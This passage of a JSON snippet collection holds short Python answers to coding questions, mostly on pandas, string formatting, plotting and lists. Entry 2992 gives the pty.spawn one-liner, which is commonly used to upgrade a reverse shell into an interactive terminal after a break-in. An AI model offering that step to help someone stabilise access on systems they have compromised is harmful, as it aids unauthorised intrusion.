    "description": "def anti_vowel(c):     newstr = c     vowels = ('a', 'e', 'i', 'o', 'u')     for x in c.lower():         if x in vowels:             newstr = newstr.replace(x,\"\")      return newstr \ndef eliminate_consonants(x):         vowels= ['a','e','i','o','u']         for char in x:             if char in vowels:                 print(char,end = \"\")  eliminate_consonants('mississippi') \nletterList = ['a', 'b', 'c', 'd'] vowelList = []  for letter in letterList:     if letter in 'aeiou':         vowelList.append(letter) \ndef anti_vowel(text):   new_text = \"\"   for i in text:     if i == 'a' or i == 'A':       pass     elif i == 'e' or i == 'E':       pass     elif i == 'I' or i == 'i':       pass     elif i == 'o' or i == 'O':       pass     elif i == 'u' or i == 'U':       pass     else:       new_text = new_text + i   return new_text  print anti_vowel('Hey look Words!') \ndef getVowels(text):  vowel_letters = [] vowel_list = ['a', 'e', 'i', 'o', 'u', 'A', 'E', 'I', 'O', 'U',]  for vowels in text:     if vowels in vowel_list:         vowel_letters.append(vowels)  return vowel_letters  print(getVowels('Hi, How are you today!')) ## Output: ['i', 'o', 'a', 'e', 'o', 'u', 'o', 'a'] \nclass Vowels(object):     def __init__(self, vowelList):         self.vowelList = vowelList          lettersList = self.vowelList.s.split(\",\")         self.vowelList = [letter for letter in self.lettersList if letter in 'aeiou'] \n",
    "reg_date": "2021-10-12T11:32:41.000Z"
  },
  {
    "id": 2980,
    "keyword": null,
    "link": null,
    "title": " python - convert a column in a dataframe into a list",
    "description": "myvar_list = df[\"myvar\"].tolist()\n",
    "reg_date": "2021-10-12T11:32:41.000Z"
  },
  {
    "id": 2981,
    "keyword": null,
    "link": null,
    "title": " python - convert index to a column",
    "description": "df.reset_index(inplace=True)\n",
    "reg_date": "2021-10-12T11:32:41.000Z"
  },
  {
    "id": 2982,
    "keyword": null,
    "link": null,
    "title": " python - count the frquency of a vlaue in a coulmn",
    "description": "df['a'].value_counts()\n",
    "reg_date": "2021-10-12T11:32:41.000Z"
  },
  {
    "id": 2983,
    "keyword": null,
    "link": null,
    "title": " python - drop a column",
    "description": "# axis=1 tells Python that we want to apply function on columns instead of rows # To delete the column permanently from original dataframe df, we can use the option inplace=True df.drop(['A', 'B', 'C'], axis=1, inplace=True)\n",
    "reg_date": "2021-10-12T11:32:41.000Z"
  },
  {
    "id": 2984,
    "keyword": null,
    "link": null,
    "title": " python - exclude rowin data frame based on value",
    "description": "df = df[df.myvar != 0] df = df[df.myvar < 2]\n",
    "reg_date": "2021-10-12T11:32:41.000Z"
  },
  {
    "id": 2985,
    "keyword": null,
    "link": null,
    "title": " python - how to get an on wifi access event",
    "description": "import socket import time import subprocess  def check():#this function checks if there is an wifi access     try:         host = socket.gethostbyname(\"www.google.com\")         s = socket.create_connection((host, 80), 2)         return True     except Exception:         return False         while True:#if you want to do something when you get a wifi access so use this loop     if check() == True:         DoSomeStuff()#whatever you want to do     else:         subprocess.call([\"/bin/bash\", \"-c\", \"rfkill\", \"block\", \"wifi\"])         subprocess.call([\"/bin/bash\", \"-c\", \"rfkill\", \"unblock\", \"wifi\"])         subprocess.Popen([\"/bin/bash\", \"-c\", \"notify-send 'conncection re-established'\"])     time.sleep(4)\n",
    "reg_date": "2021-10-12T11:32:41.000Z"
  },
  {
    "id": 2986,
    "keyword": null,
    "link": null,
    "title": " python - prime number generator",
    "description": "# Prime number generator def prime_generator(end):     for n in range(2, end):     # n starts from 2 to end         for x in range(2, n):   # check if x can be divided by n             if n % x == 0:      # if true then n is not prime                 break         else:                   # if x is found after exhausting all values of x             yield n             # generate the prime   g = prime_generator(1000)       # give firt 1000 prime numbers print(list(g)) \n",
    "reg_date": "2021-10-12T11:32:41.000Z"
  },
  {
    "id": 2987,
    "keyword": null,
    "link": null,
    "title": " python - remove repeted columns in a df",
    "description": "df.loc[:,~df.T.duplicated(keep='first')]\n",
    "reg_date": "2021-10-12T11:32:41.000Z"
  },
  {
    "id": 2988,
    "keyword": null,
    "link": null,
    "title": " python - save file",
    "description": "file = open(&ldquo;testfile.txt&rdquo;,&rdquo;w&rdquo;)    file.write(&ldquo;Hello World&rdquo;)  file.write(&ldquo;This is our new text file&rdquo;)  file.write(&ldquo;and this is another line.&rdquo;)  file.write(&ldquo;Why? Because we can.&rdquo;)    file.close() \ndef save_to_file(content, filename):     with open(filename, 'w') as file:         file.write(content)  import file_operations file_operations.save_to_file('my_content', 'data.txt')\n",
    "reg_date": "2021-10-12T11:32:42.000Z"
  },
  {
    "id": 2989,
    "keyword": null,
    "link": null,
    "title": " python - show all columns / rows of a Pandas Dataframe",
    "description": "pd.set_option('display.max_columns', None) movies.head()\npd.set_option('display.max_columns', None) pd.set_option('display.max_rows', None)\n",
    "reg_date": "2021-10-12T11:32:42.000Z"
  },
  {
    "id": 2990,
    "keyword": null,
    "link": null,
    "title": " python - sort dictionary by value",
    "description": "s = {1: 1, 7: 2, 4: 2, 3: 1, 8: 1} k = dict(sorted(s.items(),key=lambda x:x[0],reverse = True)) print(k)\nd = {'one':1,'three':3,'five':5,'two':2,'four':4}  # Sort a = sorted(d.items(), key=lambda x: x[1])  # Reverse sort r = sorted(d.items(), key=lambda x: x[1], reverse=True)\nfrom collections import OrderedDict dd = OrderedDict(sorted(d.items(), key=lambda x: x[1])) print(dd)\n",
    "reg_date": "2021-10-12T11:32:42.000Z"
  },
  {
    "id": 2991,
    "keyword": null,
    "link": null,
    "title": " python - subset specific columns name in a dataframe",
    "description": "columns = ['b', 'c'] df1 = pd.DataFrame(df, columns=columns)\ndf1 = df.iloc[:,0:2] # Remember that Python does not slice inclusive of the ending index.\nIn [25]: titanic.iloc[9:25, 2:5] Out[25]:      Pclass                                 Name     Sex 9        2  Nasser, Mrs. Nicholas (Adele Achem)  female 10       3      Sandstrom, Miss. Marguerite Rut  female 11       1             Bonnell, Miss. Elizabeth  female 12       3       Saundercock, Mr. William Henry    male 13       3          Andersson, Mr. Anders Johan    male ..     ...                                  ...     ... 20       2                 Fynney, Mr. Joseph J    male 21       2                Beesley, Mr. Lawrence    male 22       3          McGowan, Miss. Anna \"Annie\"  female 23       1         Sloper, Mr. William Thompson    male 24       3        Palsson, Miss. Torborg Danira  female  [16 rows x 3 columns] \n",
    "reg_date": "2021-10-12T11:32:42.000Z"
  },
  {
    "id": 2992,
    "keyword": null,
    "link": null,
    "title": " python -c import pty;",
    "description": "python -c 'import pty;pty.spawn(\"/bin/bash\")'\n",
    "reg_date": "2021-10-12T11:32:42.000Z"
  },
  {
    "id": 2993,
    "keyword": null,
    "link": null,
    "title": " python -m pip install",
    "description": "python -m pip install moduleName\npy -m pip install \"package\"\n# Use Chrome in selenium # Run cmd type: python -m pip install webdriver-manager  from selenium import webdriver from webdriver_manager.chrome import ChromeDriverManager browser = webdriver.Chrome(ChromeDriverManager().install()) browser.get('https://www.legifrance.gouv.fr') searchElem = browser.find_element_by_css_selector('#query') searchElem.send_keys('jurisprudence') searchElem.submit() browser.back()\n",
    "reg_date": "2021-10-12T11:32:42.000Z"
  },
  {
    "id": 2994,
    "keyword": null,
    "link": null,
    "title": " python .nlargest",
    "description": "#The .nlargest(n, columns) returns in descending order the n largest  #values in the specified column in the dataframe df.nlargest(10, 'Volume')\n",
    "reg_date": "2021-10-12T11:32:42.000Z"
  },
  {
    "id": 2995,
    "keyword": null,
    "link": null,
    "title": " python 2.7 ubuntu command",
    "description": "sudo apt install python2\n",
    "reg_date": "2021-10-12T11:32:42.000Z"
  },
  {
    "id": 2996,
    "keyword": null,
    "link": null,
    "title": " python 2 decimal places",
    "description": "num = 123.4567 formatted_num = '{0:.2f}'.format(num) # to 2 decimal places # formatted_num = '123.46'\nprint(format(432.456, \".2f\"))  >> 432.45  print(format(321,\".2f\"))  >> 321.00\na_float = 3.14159 formatted_float = \"{:.2f}\".format(a_float)\n>>> foobar = 3.141592 >>> print(f'My number is {foobar:.2f} - look at the nice rounding!')  My number is 3.14 - look at the nice rounding! \nprint (\"{0:.2f}\".format(a)) \n>>> from decimal import * >>> getcontext().prec = 6 >>> Decimal(1) / Decimal(7) Decimal('0.142857') >>> getcontext().prec = 28 >>> Decimal(1) / Decimal(7) Decimal('0.1428571428571428571428571429') \n",
    "reg_date": "2021-10-12T11:32:42.000Z"
  },
  {
    "id": 2997,
    "keyword": null,
    "link": null,
    "title": " python 2d graph",
    "description": "names = ['group_a', 'group_b', 'group_c'] values = [1, 10, 100]  plt.figure(figsize=(9, 3))  plt.subplot(131) plt.bar(names, values) plt.subplot(132) plt.scatter(names, values) plt.subplot(133) plt.plot(names, values) plt.suptitle('Categorical Plotting') plt.show() \n",
    "reg_date": "2021-10-12T11:32:42.000Z"
  },
  {
    "id": 2998,
    "keyword": null,
    "link": null,
    "title": " python 3.7 download for windows 7 32-bit",
    "description": "# Go To https://www.python.org/downloads/release/python-3710/\npython 3.7 download for windows 7 32-bit\n",
    "reg_date": "2021-10-12T11:32:43.000Z"
  },
  {
    "id": 2999,
    "keyword": null,
    "link": null,
    "title": " python 3.9 features",
    "description": "-Merge (|) and update (|=) operators have been added to the built-in dict class -str.removeprefix(prefix) and str.removesuffix(suffix) have been added to easily remove an unneeded prefix or a suffix from a string -The zoneinfo module brings support for the IANA time zone database to the standard library. It adds zoneinfo.ZoneInfo, a concrete datetime.tzinfo implementation backed by the system&rsquo;s time zone data.\n",
    "reg_date": "2021-10-12T11:32:43.000Z"
  },
  {
    "id": 3000,
    "keyword": null,
    "link": null,
    "title": " python 3 how to set a dictionary from two lists",
    "description": "mydict = dict(zip(list1, list2))\n",
    "reg_date": "2021-10-12T11:32:43.000Z"
  },
  {
    "id": 3001,
    "keyword": null,
    "link": null,
    "title": " python 3 play sound",
    "description": "#!/usr/bin/env python3 # Import playsound module from playsound import playsound   # Input an existing wav filename wavFile = input(\"Enter a wav filename: \") # Play the wav file playsound(wavFile)   # Input an existing mp3 filename mp3File = input(\"Enter a mp3 filename: \") # Play the mp3 file playsound(mp3File)\n",
    "reg_date": "2021-10-12T11:32:43.000Z"
  },
  {
    "id": 3002,
    "keyword": null,
    "link": null,
    "title": " python 3 text file leng",
    "description": "f = open(\"filename\", \"r\") #Load file in any mode that's able to read, ie r, r+, w+ etc  #to get length len(f.readlines())  #To iterate over each line for line in f.readlines(): #file.readlines(), splits the file into a list, where each element is a seperate line   print(line)\n",
    "reg_date": "2021-10-12T11:32:43.000Z"
  },
  {
    "id": 3003,
    "keyword": null,
    "link": null,
    "title": " python 64 bit",
    "description": "import sys sys.maxsize > 2**32  # it should display True in case of 64bit and False in case of 32bit\n# Latest stable release windows = \"https://www.python.org/ftp/python/3.9.4/python-3.9.4-amd64.exe\" macOS = \"https://www.python.org/ftp/python/3.9.4/python-3.9.4-macos11.pkg\"\nStep 1: Download Python newest version from   https://www.python.org/downloads/  Step 2:Install Python Step 3:Download Pycharm Community free version Step 4:Install and open Pycharm Step 5:Write print(\"Hello New World\")   //Hurray you are about to start python\n# For macs...  #  Apparently you don't want to upgrade 2.* just install 3.*  % brew install python3\n# https://www.python.org/ftp/python/3.8.2/python-3.8.2.exe\nlatest python version can be found on this website: https://www.python.org/downloads/\n",
    "reg_date": "2021-10-12T11:32:43.000Z"
  },
  {
    "id": 3004,
    "keyword": null,
    "link": null,
    "title": " python Emoji",
    "description": "# Install Emoji Package Using $ pip install emoji  from emoji import emojize print(emojize(\":thumbs_up:\"))\n",
    "reg_date": "2021-10-12T11:32:43.000Z"
  },
  {
    "id": 3005,
    "keyword": null,
    "link": null,
    "title": " python Get the current date and time (datetime)",
    "description": "from datetime import datetime  # datetime object containing current date and time now = datetime.now()   print(\"now =\", now)  # dd/mm/YY H:M:S dt_string = now.strftime(\"%d/%m/%Y %H:%M:%S\") print(\"date and time =\", dt_string)\t  # now = 2021-06-25 07:58:56.550604 # date and time = 25/06/2021 07:58:56\n",
    "reg_date": "2021-10-12T11:32:43.000Z"
  },
  {
    "id": 3006,
    "keyword": null,
    "link": null,
    "title": " python Key–value database",
    "description": "from sqlitedict import SqliteDict  mydict = SqliteDict('./my_db.sqlite', autocommit=True) mydict['some_key'] = any_picklable_object print(mydict['some_key']) for key, value in mydict.items():     print(key, value) print(len(mydict)) mydict.close()\n",
    "reg_date": "2021-10-12T11:32:43.000Z"
  },
  {
    "id": 3007,
    "keyword": null,
    "link": null,
    "title": " python ModuleNotFoundError",
    "description": "if you encounter this error:  ModuleNotFoundError: Cannot import name whatever  with a python file called \"whatever\", then this might be cause by the following issues: \t1. file \"whatever\" is not in the same folder as the current file.     \tthis means that you need to place file \"whatever\" inside         the same file that gave you the import error.     2. library/module \"whatever\" is not installed.     \tif \"whatever\" is a third-party library/module,         then you need to install the library/module.         This is usually done with \"pip install whatever\",         but exceptions do exist that the command is not         the proper command to install \"whatever\"     3. if this file is in another folder, but you don't want to move it.     \tin this case, you should add this at the top of your file:         \timport sys \t\t\tsys.path.append('path/to/file/whatever.py')         replace 'path/to/file' with the proper directory of \"whatever.py\"     4. you forgot to create \"whatever.py\"!     \twell... just remember to do that before importing.  This does not include all of the possibilities. Hope this helped :D\n",
    "reg_date": "2021-10-12T11:32:43.000Z"
  },
  {
    "id": 3008,
    "keyword": null,
    "link": null,
    "title": " python RuntimeError: tf.placeholder() is not compatible with eager execution.",
    "description": "tf.compat.v1.disable_eager_execution()\n",
    "reg_date": "2021-10-12T11:32:43.000Z"
  },
  {
    "id": 3009,
    "keyword": null,
    "link": null,
    "title": " python RuntimeWarning: overflow encountered in long scalars",
    "description": "# Error: RuntimeWarning: overflow encountered in long_scalars  # Solution: # This error usually comes up because the data type you're using can't  # handle the size of number you're trying to manipulate. For example, # the largest number you can manipulate with int32 is 2147483647.  # Depending on the size of numbers you're dealing with, setting the data # type to int64 or float64 might solve the problem. E.g.: numpy_array = np.array(my_list, dtype=numpy.float64)\n",
    "reg_date": "2021-10-12T11:32:43.000Z"
  },
  {
    "id": 3010,
    "keyword": null,
    "link": null,
    "title": " python UDP send",
    "description": "import socket  SOURCE_IP = \"192.168.1.123\" SOURCE_PORT = 5678 DESTINATION_IP = \"192.168.1.124 DESTINATION_PORT = 5679  # create the socket udp_socket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) udp_socket.bind((SOURCE_IP,SOURCE_PORT))  # prepare the payload payload_hex_string = \"68656c6c6f5f776f726c64\" #hello_world payload = bytes.fromhex(payload_hex_string)  #send out the packet udp_socket.sendto(payload,(DESTINATION_IP,DESTINATION_PORT))\n",
    "reg_date": "2021-10-12T11:32:44.000Z"
  },
  {
    "id": 3011,
    "keyword": null,
    "link": null,
    "title": " python WSGI server",
    "description": "from flask import Flask  app = Flask(__name__)  @app.route(\"/\") def index():     return \"<h1>Hello!</h1>\"  if __name__ == \"__main__\":     from waitress import serve     serve(app, host=\"0.0.0.0\", port=8080) \n--- Disclaimer --- Some of these like Gunicorn, Nginx, uWSGI won't work on windows. The only WSGI server that I know that work on windows is waitress.  List of WSGI servers you could use:   - Gunicorn   - Waitress (I recommend this for windows users)   - uWSGI   - Nginx   - Django (It's built in with WSGI)   - Apache\n",
    "reg_date": "2021-10-12T11:32:44.000Z"
  },
  {
    "id": 3012,
    "keyword": null,
    "link": null,
    "title": " python   init subclass  ",
    "description": "In [16]: class Foo:     ...:     def __init_subclass__(cls):     ...:         print('ok')     ...:         print(cls.att)  In [17]: class SubFoo(Foo):     ...:     att = 1     ...:     pass     ...: ok 1  # So: __init_subclass__ runs everytime that Foo is subclassed. # Also: the argument `cls` of __init_subclass__ is the subclass.\nclass Philosopher:     def __init_subclass__(cls, default_name, **kwargs):         super().__init_subclass__(**kwargs)         print(f\"Called __init_subclass({cls}, {default_name})\")         cls.default_name = default_name  class AustralianPhilosopher(Philosopher, default_name=\"Bruce\"):     pass  class GermanPhilosopher(Philosopher, default_name=\"Nietzsche\"):     default_name = \"Hegel\"     print(\"Set name to Hegel\")  Bruce = AustralianPhilosopher() Mistery = GermanPhilosopher() print(Bruce.default_name) print(Mistery.default_name) \n",
    "reg_date": "2021-10-12T11:32:44.000Z"
  },
  {
    "id": 3013,
    "keyword": null,
    "link": null,
    "title": " python  class constructor",
    "description": "class Human: \tdef __init__(self, name):       self.name = name  h1 = Human(\"Bob\") print(h1.name) # prints Bob, the name passed from constructor\n",
    "reg_date": "2021-10-12T11:32:44.000Z"
  },
  {
    "id": 3014,
    "keyword": null,
    "link": null,
    "title": " python añadir elementos a una lista",
    "description": ">>> lista_compra = [\"huevos\", \"leche\"]  # A&ntilde;adir un elemento >>> lista_compra.append(\"cereales\") >>> lista_compra [\"huevos\", \"leche\", \"cereales\"]  # A&ntilde;adir varios elementos >>> lista_extra = [\"manzanas\", \"aguacate\"] >>> lista_compra.extend(lista_extra) >>> lista_compra [\"huevos\", \"leche\", \"cereales\", \"manzanas\", \"aguacate\"]\n",
    "reg_date": "2021-10-12T11:32:44.000Z"
  },
  {
    "id": 3015,
    "keyword": null,
    "link": null,
    "title": " python absolute value",
    "description": ">>>abs(-15) 15\nvalue = -54.26 abs(value)\nabs(n)\nval = -85 abs_val = abs(val)\n",
    "reg_date": "2021-10-12T11:32:44.000Z"
  },
  {
    "id": 3016,
    "keyword": null,
    "link": null,
    "title": " python access index in for loop",
    "description": "items=['baseball','basketball','football'] for index, item in enumerate(items):     print(index, item)\nfor index, item in enumerate(items):     print(index, item)  #if you want to start from 1 instead of 0 for count, item in enumerate(items, start=1):     print(count, item)\nfor index, value in enumerate(iterator):     print(index, value)\nmy_list = [0,1,2,3,4] for idx, val in enumerate(my_list):     print('{0}: {1}'.format(idx,val)) #This will print: #0: 0 #1: 1 #2: 2 #...\n# There are two ways to do this # The \"beginner\" one: index = 0 foods = [\"burger\", \"pizza\", \"apple\", \"donut\", \"coconut\"] for food in foods:   print(\"Food\", index, \"is\", food)   index += 1  # Or using enumerate: foods = [\"burger\", \"pizza\", \"apple\", \"donut\", \"coconut\"] for index, value in enumerate(foods):     print(\"Food\", index, \"is\", value)  # By convention, you should understand and use the enumerate function as it makes the code look much cleaner.\ncolors = [\"red\", \"green\", \"blue\", \"purple\"]  for i in range(len(colors)):     print(colors[i]) \n",
    "reg_date": "2021-10-12T11:32:44.000Z"
  },
  {
    "id": 3017,
    "keyword": null,
    "link": null,
    "title": " python actualizar pip",
    "description": "python -m pip install --upgrade pip\n",
    "reg_date": "2021-10-12T11:32:44.000Z"
  },
  {
    "id": 3018,
    "keyword": null,
    "link": null,
    "title": " python add 1 to count",
    "description": "count = 0 count += 1 print(count)\n",
    "reg_date": "2021-10-12T11:32:44.000Z"
  },
  {
    "id": 3019,
    "keyword": null,
    "link": null,
    "title": " python add a point to a plot",
    "description": "# Basic syntax plt.plot(x, y, 'marker')  # Example usage: import matplotlib.pyplot as plt import numpy as np  # Data to plot x = np.linspace(0, 10, 100)  # Plot figure fig = plt.figure() plt.plot(x, np.sin(x), '-')  # Add point plt.plot(5, 0, 'ro')  # Note, see all marker styles here: #    https://matplotlib.org/stable/api/markers_api.html\n",
    "reg_date": "2021-10-12T11:32:45.000Z"
  },
  {
    "id": 3020,
    "keyword": null,
    "link": null,
    "title": " python add all items in list",
    "description": "myList = [1, 2, 3, 4, 5, 6] sum(myList) # output: 21\n>>> list = [1, 2, 3] >>> sum(list) 6\n",
    "reg_date": "2021-10-12T11:32:45.000Z"
  },
  {
    "id": 3021,
    "keyword": null,
    "link": null,
    "title": " python add datetime to filename",
    "description": "from datetime import datetime  date = datetime.now().strftime(\"%Y_%m_%d-%I:%M:%S_%p\") print(f\"filename_{date}\")  'filename_2020_08_12-03:29:22_AM'\n",
    "reg_date": "2021-10-12T11:32:45.000Z"
  },
  {
    "id": 3022,
    "keyword": null,
    "link": null,
    "title": " python add legend title",
    "description": "# Basic syntax: plt.legend(title=\"your title\")\n",
    "reg_date": "2021-10-12T11:32:45.000Z"
  },
  {
    "id": 3023,
    "keyword": null,
    "link": null,
    "title": " python add unique to list",
    "description": "myList = ['Arise', 'But', 'It', 'Juliet', 'Who', 'already', 'and', 'and', 'and',       'breaks', 'east', 'envious', 'fair', 'grief', 'is', 'is', 'is', 'kill', 'light',       'moon', 'pale', 'sick', 'soft', 'sun', 'sun', 'the', 'the', 'the',       'through', 'what', 'window', 'with', 'yonder']  auxiliaryList = [] for word in myList:     if word not in auxiliaryList:         auxiliaryList.append(word)\n",
    "reg_date": "2021-10-12T11:32:45.000Z"
  },
  {
    "id": 3024,
    "keyword": null,
    "link": null,
    "title": " python add vertical line in plot",
    "description": "# Basic syntax: plt.axvline(x_coordinate)  # Example usage: import matplotlib.pyplot as plt plt.figure(figsize=(5, 5)) plt.axvline(x=10, ymin=0.10, ymax=0.70, color='b', ls='--', lw=1.5, label='axvline - % of full height') plt.legend(bbox_to_anchor=(1.0, 1), loc='best') plt.show()  # Where: #\t- x is the x axis coordinate for the vertical line #\t- ymin is the minimum y-value to show #\t- ymax is the maximum y-value to show #\t- ls is the line style (see also '-', '-.', and ':') #\t- lw is the line width\nxposition = [0.3, 0.4, 0.45] for xc in xposition:     plt.axvline(x=xc, color='k', linestyle='--')\n",
    "reg_date": "2021-10-12T11:32:45.000Z"
  },
  {
    "id": 3025,
    "keyword": null,
    "link": null,
    "title": " python add zero to string",
    "description": "# add zeros in front of a string >>> n = '4' >>> print(n.zfill(3)) 004\n# add zeros to numbers >>> n = 4 >>> print(f'{n:03}') # Preferred method, python >= 3.6 004 >>> print('\u0003d' % n) 004 >>> print(format(n, '03')) # python >= 2.6 004 >>> print('{0:03d}'.format(n))  # python >= 2.6 + python 3 004 >>> print('{foo:03d}'.format(foo=n))  # python >= 2.6 + python 3 004 >>> print('{:03d}'.format(n))  # python >= 2.7 + python3 004\nf_num.strip().zfill(2)\n",
    "reg_date": "2021-10-12T11:32:45.000Z"
  },
  {
    "id": 3026,
    "keyword": null,
    "link": null,
    "title": " python adding and subtracting sets",
    "description": "a = {10,20,30,40} b = {30,40,50,60}   print(a & b) print(a.intersection(b)) #OUTPUT #{30,40}  print(a | b) print(a.union(b)) #OUTPUT #{10,20,30,40,50,60}  print(a - b) print(a.difference(b)) #OUTPUT #{10,20}  print(b - a) print(b.difference(a)) #OUTPUT #{50,60}\n",
    "reg_date": "2021-10-12T11:32:45.000Z"
  },
  {
    "id": 3027,
    "keyword": null,
    "link": null,
    "title": " python all possible combinations of multiple lists",
    "description": ">>> import itertools >>> a = [[1,2,3],[4,5,6],[7,8,9,10]] >>> list(itertools.product(*a)) [(1, 4, 7), (1, 4, 8), (1, 4, 9), (1, 4, 10), (1, 5, 7), (1, 5, 8), (1, 5, 9), (1, 5, 10), (1, 6, 7), (1, 6, 8), (1, 6, 9), (1, 6, 10), (2, 4, 7), (2, 4, 8), (2, 4, 9), (2, 4, 10), (2, 5, 7), (2, 5, 8), (2, 5, 9), (2, 5, 10), (2, 6, 7), (2, 6, 8), (2, 6, 9), (2, 6, 10), (3, 4, 7), (3, 4, 8), (3, 4, 9), (3, 4, 10), (3, 5, 7), (3, 5, 8), (3, 5, 9), (3, 5, 10), (3, 6, 7), (3, 6, 8), (3, 6, 9), (3, 6, 10)]\na = [\"foo\", \"melon\"] b = [True, False] c = list(itertools.product(a, b)) >> [(\"foo\", True), (\"foo\", False), (\"melon\", True), (\"melon\", False)]\n",
    "reg_date": "2021-10-12T11:32:45.000Z"
  },
  {
    "id": 3028,
    "keyword": null,
    "link": null,
    "title": " python allowed variable caracters",
    "description": "Letters: A-Z, a-z Digits: 0-9\t\t# the first character of a variable name cannot be a digit And the underscore character _\n",
    "reg_date": "2021-10-12T11:32:45.000Z"
  },
  {
    "id": 3029,
    "keyword": null,
    "link": null,
    "title": " python alphabet",
    "description": "['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']\nalphabet_list = list(string.ascii_lowercase)\n>>> import string >>> string.ascii_lowercase 'abcdefghijklmnopqrstuvwxyz'\n#Python: premade alphabet string   import string string.ascii_lowercase \t#output: 'abcdefghijklmnopqrstuvwxyz' string.ascii_uppercase \t#output: 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'\na1 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\" a2 = [\"A\",\"B\",\"C\",\"D\",\"E\",\"F\",\"G\",\"H\",\"I\",\"J\",\"K\",\"L\",\"M\",\"N\",\"O\",\"P\",\"Q\",\"R\",\"S\",\"T\",\"U\",\"V\",\"W\",\"X\",\"Y\",\"Z\"] a3 = \"abcdefghijklmnopqrstuvwxyz\" a4 = [\"a\",\"b\",\"c\",\"d\",\"e\",\"f\",\"g\",\"h\",\"i\",\"j\",\"k\",\"l\",\"m\",\"n\",\"o\",\"p\",\"q\",\"r\",\"s\",\"t\",\"u\",\"v\",\"w\",\"x\",\"y\",\"z\"]\nfor i in range(ord('a'), ord('z') + 1):   print(chr(i))   # prints all letters in english the alphabet\n",
    "reg_date": "2021-10-12T11:32:46.000Z"
  },
  {
    "id": 3030,
    "keyword": null,
    "link": null,
    "title": " python alphabet capital",
    "description": "a1 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\" a2 = [\"A\",\"B\",\"C\",\"D\",\"E\",\"F\",\"G\",\"H\",\"I\",\"J\",\"K\",\"L\",\"M\",\"N\",\"O\",\"P\",\"Q\",\"R\",\"S\",\"T\",\"U\",\"V\",\"W\",\"X\",\"Y\",\"Z\"] a3 = \"abcdefghijklmnopqrstuvwxyz\" a4 = [\"a\",\"b\",\"c\",\"d\",\"e\",\"f\",\"g\",\"h\",\"i\",\"j\",\"k\",\"l\",\"m\",\"n\",\"o\",\"p\",\"q\",\"r\",\"s\",\"t\",\"u\",\"v\",\"w\",\"x\",\"y\",\"z\"]\n",
    "reg_date": "2021-10-12T11:32:46.000Z"
  },
  {
    "id": 3031,
    "keyword": null,
    "link": null,
    "title": " python and operator returns",
    "description": "''' Now the interesting part.  The and and or operators actually return values!  With the and operator, each argument is evaluated, and if they all evaluate to True,  the last argument is returned. Otherwise the first False argument is returned. ''' a = 1 b = 5 print a and b\t# 5 print b and a\t# 1 print a and False\t# False print a and True\t# True print a and None\t# None print False and a\t# False print None and a\t# None print True and 'a' and 0 and True # first False item is zero, 0\n",
    "reg_date": "2021-10-12T11:32:46.000Z"
  },
  {
    "id": 3032,
    "keyword": null,
    "link": null,
    "title": " python anonymous function multiple arguments",
    "description": "def sum ( a, b ):\t\t\t# non anonymous         return a+b print (sum(1, 2))\t\t\t# 3  sum = lambda a,b: (a+b)\t\t# anonymous / lambda print (sum(1, 2))\t\t\t# 3\n",
    "reg_date": "2021-10-12T11:32:46.000Z"
  },
  {
    "id": 3033,
    "keyword": null,
    "link": null,
    "title": " python ansi escape sequences color collection",
    "description": "Black            \\e[0;30m Blue             \\e[0;34m Green            \\e[0;32m Cyan             \\e[0;36m Red              \\e[0;31m Purple           \\e[0;35m Brown            \\e[0;33m Gray             \\e[0;37m Dark Gray        \\e[1;30m Light Blue       \\e[1;34m Light Green      \\e[1;32m Light Cyan       \\e[1;36m Light Red        \\e[1;31m Light Purple     \\e[1;35m Yellow           \\e[1;33m White            \\e[1;37m \nclass colors:     reset = \"\\033[0m\"      # Black     fgBlack = \"\\033[30m\"     fgBrightBlack = \"\\033[30;1m\"     bgBlack = \"\\033[40m\"     bgBrightBlack = \"\\033[40;1m\"      # Red     fgRed = \"\\033[31m\"     fgBrightRed = \"\\033[31;1m\"     bgRed = \"\\033[41m\"     bgBrightRed = \"\\033[41;1m\"      # Green     fgGreen = \"\\033[32m\"     fgBrightGreen = \"\\033[32;1m\"     bgGreen = \"\\033[42m\"     bgBrightGreen = \"\\033[42;1m\"      # Yellow     fgYellow = \"\\033[33m\"     fgBrightYellow = \"\\033[33;1m\"     bgYellow = \"\\033[43m\"     bgBrightYellow = \"\\033[43;1m\"      # Blue     fgBlue = \"\\033[34m\"     fgBrightBlue = \"\\033[34;1m\"     bgBlue = \"\\033[44m\"     bgBrightBlue = \"\\033[44;1m\"      # Magenta     fgMagenta = \"\\033[35m\"     fgBrightMagenta = \"\\033[35;1m\"     bgMagenta = \"\\033[45m\"     bgBrightMagenta = \"\\033[45;1m\"      # Cyan     fgCyan = \"\\033[36m\"     fgBrightCyan = \"\\033[36;1m\"     bgCyan = \"\\033[46m\"     bgBrightCyan = \"\\033[46;1m\"      # White     fgWhite = \"\\033[37m\"     fgBrightWhite = \"\\033[37;1m\"     bgWhite = \"\\033[47m\"     bgBrightWhite = \"\\033[47;1m\"\n",
    "reg_date": "2021-10-12T11:32:46.000Z"
  },
  {
    "id": 3034,
    "keyword": null,
    "link": null,
    "title": " python api define bearer token",
    "description": "import requests endpoint = \".../api/ip\" data = {\"ip\": \"1.1.2.3\"} headers = {\"Authorization\": \"Bearer MYREALLYLONGTOKENIGOT\"}  print(requests.post(endpoint, data=data, headers=headers).json())\n",
    "reg_date": "2021-10-12T11:32:46.000Z"
  },
  {
    "id": 3035,
    "keyword": null,
    "link": null,
    "title": " python append in specific position",
    "description": "# --> list.insert(position, element) <--  # List of string  list1 = ['Hi' ,  'hello', 'at', 'this', 'there', 'from']  # Add an element at 3rd position in the list list1.insert(3, 'why') #-> ['Hi', 'hello', 'at', 'why', 'this', 'there', 'from']\n",
    "reg_date": "2021-10-12T11:32:46.000Z"
  },
  {
    "id": 3036,
    "keyword": null,
    "link": null,
    "title": " python append to 2d array",
    "description": "temp_list = [[], [], [], []] temp_list[0].append(\"a1\") temp_list[1].append(\"a2\") temp_list[2].append(\"a3\") temp_list[3].append(\"a4\")\na_2d_list = [[1, 2], [3, 4]] a_2d_list.append([5, 6])\nnew_row.append([])\narr = [] arr.append([]) arr[0].append('aa1') arr[0].append('aa2')\n",
    "reg_date": "2021-10-12T11:32:46.000Z"
  },
  {
    "id": 3037,
    "keyword": null,
    "link": null,
